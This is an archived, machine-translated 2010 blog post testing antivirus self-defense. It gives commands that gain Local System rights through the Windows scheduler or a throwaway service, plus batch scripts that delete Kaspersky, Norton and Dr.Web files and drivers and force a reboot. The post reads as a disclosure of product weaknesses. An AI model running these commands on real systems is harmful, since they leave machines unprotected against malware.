<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Antivirus self-defense or cut antivirus without a knife</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello to all! 

 Recently, we have already discussed the power of the heuristic technologies of modern antiviruses and came to the conclusion that no ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Antivirus self-defense or cut antivirus without a knife</h1><div class="post__text post__text-html js-mediator-article"> <b>Hello to all!</b> <br><br>  Recently, we have already discussed the power of the heuristic technologies of modern antiviruses and came to the conclusion that no one can believe.  Even sometimes myself :) <br><br>  Today we will talk about another controversial moment of anti-virus - self-defense.  Some vendors are very serious about this moment, and their products stand up even in complex complex cases of active infection, effectively removing viral intercepts, installing into the system and even subsequently deleting maliciously registered malware.  Others believe that active infection is a battle with windmills, which does not lead to anything worthwhile, and therefore - LiveCD, and in some cases format c: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Let us pay tribute to both opponents: of course, if there is an opportunity to defeat a viral confrontation, this is good.  Unless this leads to bsodam and boot the system for a couple of days.  And it is absolutely obvious that with serious and complex infection it is often impossible to break through the active mass of interceptions, malicious processes at the kernel level and others - and therefore it is often more reasonable to treat the inactive system (with a LiveCD or scanning the hard drive on an uninfected machine), but in case of bitty file infection - and think about the complete reinstallation of the OS. <br><br>  But let's not indulge in disputes - let's leave it for the next article :) Let's talk about a simple one: about self-defense of the system even on a deliberately uninfected system.  And take a priori: <br><br>  1) there is a complex product antivirus + hips + firewall; <br>  2) the system was not infected, but the malicious code somehow penetrated; <br>  3) the malicious code has the intention to remove the antivirus or damage it so as to ensure complete inoperability. <br><br>  The option of actions will be the simplest - an attempt to delete vital antivirus files with Local System rights.  The idea of ‚Äã‚Äãthis approach belongs to my good friend Alexey Baranov, who reported about it in closed circles some time ago.  The time has passed, we will assume that the vendors have tightened up - check it out. <br><a name="habracut"></a><br>  On Windows-based systems, working as an administrator (and this is probably 80% of all systems), getting the Local System rights is quite simple.  Immediately comes to mind two ways, well described in the network. <br><br>  <b>Method 1. Using the scheduler.</b> <br>  By default, the task scheduler service runs on all Windows systems.  This service runs the task with the required Local System rights.  Then it's very easy to add a task somehow: <br> <code>at 11:05 c:\killer.bat</code> <br>  and kill.bat will run as Local System. <br><br>  The advantages are obvious: everything is simple and clear.  Disadvantage: the user may notice a strange new task in the scheduler, and just for security reasons, disable this service. <br><br>  <b>Method 1. Creating a service.</b> <br>  The essence of the method is to create a service, start it and delete it.  In this case, everything is implemented in three lines: <br> <code>sc create CmdAsSystem type= own type= interact binPath= "cmd /c start /low /b cmd /c (c:\killer.bat)" <br> net start CmdAsSystem <br> sc delete CmdAsSystem</code> <br> <br>  At the same time, not only will <em>killer.bat</em> run with IDLE priority, it will also run on behalf of the Local System. <br>  The method is invisible, does not manifest itself. <br><br>  At the time of publication of the KIS 2010 article, both methods skipped at the hips level, without even asking for any permissions. <br><br>  Now let's move on to <em>killer.bat</em> itself (in our case, it is located at the root of drive C, but it is clear that you can throw it anywhere). <br><br>  The essence of this file is simple: delete everything that belongs to the antivirus.  So, for Kaspersky 2010 it will be: <br> <code>net stop srservice <br> erase /F /S /Q "C:\Program Files\Kaspersky Lab\Kaspersky Internet Security 2010" <br> erase /F /S /Q "%windir%\system32\drivers\kl1.sys" <br> erase /F /S /Q "%windir%\system32\drivers\klif.sys" <br> erase /F /S /Q "%windir%\system32\drivers\klbg.sys" <br> erase /F /S /Q "%windir%\system32\drivers\klim5.sys" <br> erase /F /S /Q "%windir%\system32\drivers\klmd.sys" <br> erase /F /S /Q "%windir%\system32\drivers\klmouflt.sys" <br> shutdown -r -f -c "Bye-Bye!!!"</code> <br> <br>  For Symantec, something like (who knows more precisely - correct, I myself am on Kaspersky): <br> <code>net stop srservice <br> erase /F /S /Q "C:\Program Files\Symantec" <br> erase /F /S /Q "C:\Program Files\Norton Internet Security" <br> shutdown -r -f -c "Bye-Bye!!!"</code> <br> <br>  For Doctor Web: <br> <code>net stop srservice <br> erase /F /S /Q "C:\Program Files\DrWeb" <br> erase /F /S /Q "%windir%\system32\drivers\dwprot.sys" <br> erase /F /S /Q "%windir%\system32\drivers\drwebaf.sys" <br> erase /F /S /Q "%windir%\system32\drivers\DrWebPF.sys" <br> erase /F /S /Q "%windir%\system32\drivers\spiderg3.sys" <br> shutdown -r -f -c "Bye-Bye!!!"</code> <br> <br>  Well, and so on.  In the first line there is a stop of the Windows recovery service - just in case :) <br><br>  It is clear that a similar script can be prescribed for all antiviruses - the essence of changing the paths to vital files. <br><br>  Total - what do we have? <br><br>  1. KIS 2010 received such damage that it was killed and the system was left without protection.  KIS 2011 is devoid of this sexual weakness - but it's still beta ... <br>  2. NIS lost several files, but the performance did not fail, the files were subsequently downloaded and restored when upgrading from the Internet. <br>  3. DrWeb did not suffer at all, as expected, taking into account the special emphasis of the developer on the opposition of the infection.  But do not forget that <a href="http://www.rootkit.com/blog.php%3Fnewsid%3D1018">there is SpiDie for the Web</a> ... <br><br>  At the same time, the hipsa of the above products quietly missed both variants of the manipulations (IK checked personally). <br><br>  <b>FINDINGS</b> <br>  Unfortunately, we have to admit the fact that some of the existing antivirus solutions have a number of vulnerabilities that can be used to damage the protection and actually remove the antivirus from the computer. <br><br>  It is proposed in the comments to supplement the observations and research on other anti-virus products (preferably with heaps, in order to assess the level of blocking actions for obtaining Local System rights).  I think that the described manipulations are clear and can be easily reproduced on virtual machines of enthusiasts. <br><br>  <b>Cheers!</b> <img src="https://habrastorage.org/getpro/habr/post_images/013/a26/0d7/013a260d77b8692d715c5e6b0cd3fb9f.gif" alt="image"></div><p>Source: <a href="https://habr.com/ru/post/98322/">https://habr.com/ru/post/98322/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../98316/index.html">Mass mutation or as Google blows off</a></li>
<li><a href="../98317/index.html">We get exchange rates before anyone else</a></li>
<li><a href="../98318/index.html">Attempt to analyze Toshiba upgrade actions</a></li>
<li><a href="../98320/index.html">Follow the authors</a></li>
<li><a href="../98321/index.html">Release Midnight Commander 4.7.3</a></li>
<li><a href="../98323/index.html">Electronic digital signature for dummies: what it is and how not to choke. Part 3</a></li>
<li><a href="../98326/index.html">Attacked by the App Store: many iTunes accounts are hacked</a></li>
<li><a href="../98327/index.html">Labs in physics on php</a></li>
<li><a href="../98331/index.html">10 founding fathers of the web</a></li>
<li><a href="../98335/index.html">Review of fresh materials, May-June 2010</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>